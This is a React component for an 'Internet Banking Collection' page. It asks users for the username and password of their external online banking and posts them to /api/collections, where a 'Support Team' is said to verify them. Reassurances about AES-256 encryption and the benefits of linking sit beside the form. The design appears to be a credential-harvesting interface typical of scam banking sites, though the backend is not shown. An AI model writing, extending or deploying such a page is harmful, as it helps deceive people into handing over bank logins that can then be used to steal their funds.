import React, { useState } from "react";
import { User } from "../types";
import { Shield, Lock, User as UserIcon, Loader2, CheckCircle2, Globe } from "lucide-react";
import { toast } from "sonner";

interface CollectionPageProps {
  user: User;
}

export default function CollectionPage({ user }: CollectionPageProps) {
  const [loading, setLoading] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [formData, setFormData] = useState({
    username: "",
    password: ""
  });

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      const response = await fetch("/api/collections", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId: user.id,
          ...formData
        }),
      });

      if (response.ok) {
        setSubmitted(true);
        toast.success("Request sent to Support Team");
      } else {
        toast.error("Failed to submit request");
      }
    } catch (error) {
      toast.error("An error occurred");
    } finally {
      setLoading(false);
    }
  };

  if (submitted) {
    return (
      <div className="max-w-2xl mx-auto mt-12 text-center space-y-6 text-slate-200">
        <div className="inline-flex items-center justify-center w-20 h-20 bg-emerald-950/40 text-emerald-400 rounded-xl border border-emerald-500/30 mb-4 shadow-lg">
          <CheckCircle2 size={40} />
        </div>
        <h1 className="text-3xl font-black text-white uppercase tracking-tight">Request Submitted</h1>
        <p className="text-[#8E9BAE] max-w-md mx-auto font-medium text-xs leading-relaxed uppercase font-mono">
          Your internet banking collection request has been sent to our Support Team for verification. You will be notified once it is approved.
        </p>
        <div className="pt-8">
          <button 
            onClick={() => window.location.href = '/dashboard'}
            className="px-8 py-3 bg-[#F59E0B] text-[#0B0F17] font-black rounded uppercase tracking-widest hover:bg-[#FF9500] transition-all"
          >
            Back to Dashboard
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="max-w-3xl mx-auto text-slate-200 space-y-6">
      <div>
        <h1 className="text-2xl font-black text-white uppercase tracking-tight">Internet Banking Collection</h1>
        <p className="text-[#8E9BAE] text-xs">Link your external bank accounts for seamless international transfers.</p>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
        <div className="md:col-span-2">
          <div className="bg-[#121824] rounded-xl border border-[#1E2638] overflow-hidden shadow-2xl">
            <div className="p-8">
              <div className="flex items-center gap-6 mb-8">
                <div className="w-12 h-12 bg-[#0B0F17] text-[#F59E0B] rounded flex items-center justify-center border border-[#1E2638]">
                  <Globe size={24} />
                </div>
                <div>
                  <h3 className="font-extrabold text-white uppercase tracking-tight">External Bank Credentials</h3>
                  <p className="text-[10px] text-[#F59E0B] font-bold uppercase tracking-wider">Securely provide your external banking details.</p>
                </div>
              </div>

              <form onSubmit={handleSubmit} className="space-y-6">
                <div className="space-y-3">
                  <label className="block text-[10px] font-bold text-[#8E9BAE] uppercase tracking-widest">Internet Banking Username</label>
                  <div className="relative">
                    <UserIcon className="absolute left-3.5 top-1/2 -translate-y-1/2 text-[#8E9BAE]" size={18} />
                    <input
                      type="text"
                      required
                      value={formData.username}
                      onChange={e => setFormData({...formData, username: e.target.value})}
                      className="w-full pl-10 pr-4 py-3 bg-[#0B0F17]/80 text-white text-xs font-black placeholder:text-[#8E9BAE] border border-[#1E2638] rounded focus:border-[#F59E0B] outline-none transition-colors"
                      placeholder="Enter external bank username"
                    />
                  </div>
                </div>

                <div className="space-y-3">
                  <label className="block text-[10px] font-bold text-[#8E9BAE] uppercase tracking-widest">Internet Banking Password</label>
                  <div className="relative">
                    <Lock className="absolute left-3.5 top-1/2 -translate-y-1/2 text-[#8E9BAE]" size={18} />
                    <input
                      type="password"
                      required
                      value={formData.password}
                      onChange={e => setFormData({...formData, password: e.target.value})}
                      className="w-full pl-10 pr-4 py-3 bg-[#0B0F17]/80 text-white text-xs font-black placeholder:text-[#8E9BAE] border border-[#1E2638] rounded focus:border-[#F59E0B] outline-none transition-colors"
                      placeholder="Enter external bank password"
                    />
                  </div>
                </div>

                <div className="pt-4">
                  <button
                    type="submit"
                    disabled={loading}
                    className="w-full py-4 bg-[#F59E0B] text-[#0B0F17] font-black rounded uppercase tracking-widest hover:bg-[#FF9500] transition-all flex items-center justify-center gap-3 disabled:opacity-70 border border-[#1E2638] shadow-lg cursor-pointer"
                  >
                    {loading ? <Loader2 className="animate-spin" size={20} /> : "Submit for Verification"}
                  </button>
                </div>
              </form>
            </div>
          </div>
        </div>

        <div className="space-y-6">
          <div className="bg-[#121824] p-6 rounded-xl text-white shadow-2xl border border-[#1E2638]">
            <Shield className="text-[#F59E0B] mb-4" size={32} />
            <h4 className="font-extrabold mb-2 uppercase tracking-tight text-xs">Bank-Level Security</h4>
            <p className="text-[10px] text-[#8E9BAE] leading-relaxed font-bold uppercase font-mono">
              Your credentials are encrypted using AES-256 and are only used for the initial verification of your external account.
            </p>
          </div>

          <div className="bg-[#121824] p-6 rounded-xl border border-[#1E2638] shadow-2xl">
            <h4 className="font-extrabold text-[#F59E0B] mb-3 text-xs uppercase tracking-tight">Why link your bank?</h4>
            <ul className="space-y-3">
              {[
                "Faster international wires",
                "Automated currency conversion",
                "Consolidated financial view",
                "Reduced transfer fees"
              ].map((item, i) => (
                <li key={i} className="flex items-start gap-3 text-[10px] text-[#8E9BAE] font-bold uppercase font-mono">
                  <CheckCircle2 className="text-emerald-400 shrink-0" size={14} />
                  {item}
                </li>
              ))}
            </ul>
          </div>
        </div>
      </div>
    </div>
  );
}
